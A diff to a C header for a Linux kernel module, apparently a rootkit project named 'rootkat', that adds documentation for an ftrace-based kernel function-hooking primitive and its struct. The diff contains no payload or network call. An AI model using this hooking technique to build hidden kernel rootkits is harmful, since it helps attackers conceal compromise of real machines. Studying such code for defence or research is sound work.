@@ -4,11 +4,34 @@
 
 #include <linux/ftrace.h>
 
+/*
+ * ftrace-based function hooking primitive.
+ *
+ * Lifecycle:
+ *   1. Caller declares a (zero-initialized) struct rootkat_hook with
+ *      .candidates (NULL-terminated symbol list) and .replacement set.
+ *   2. rootkat_hook_install() resolves a candidate, installs the ftrace
+ *      op, and writes .original (call this from the replacement to defer
+ *      to the real function).
+ *   3. rootkat_hook_remove() undoes both. Idempotent on never-installed.
+ *
+ * Constraints on .replacement:
+ *   - Must NOT tail-call .original — gcc may sibling-call optimize the
+ *     return through ftrace, which defeats the within_module recursion
+ *     guard. Mark the replacement noinline if you need to be sure, or
+ *     keep the call to original surrounded by other work.
+ *   - Type-erased via void *; cast to the target's exact signature when
+ *     invoking. ABI-safe on x86_64; theoretical strict-aliasing UB.
+ *
+ * Thread safety:
+ *   - Not thread-safe per hook. Caller must serialize install/remove on
+ *     the same struct. Module init/exit context is sufficient for v1.
+ */
 struct rootkat_hook {
 	const char * const *candidates;  /* NULL-terminated symbol candidates */
 	void *replacement;               /* called instead of target */
 	void *original;                  /* set by install: call this to defer */
-	unsigned long target;            /* resolved address */
+	unsigned long target;            /* resolved address; 0 = not installed */
 	struct ftrace_ops ops;
 };
 
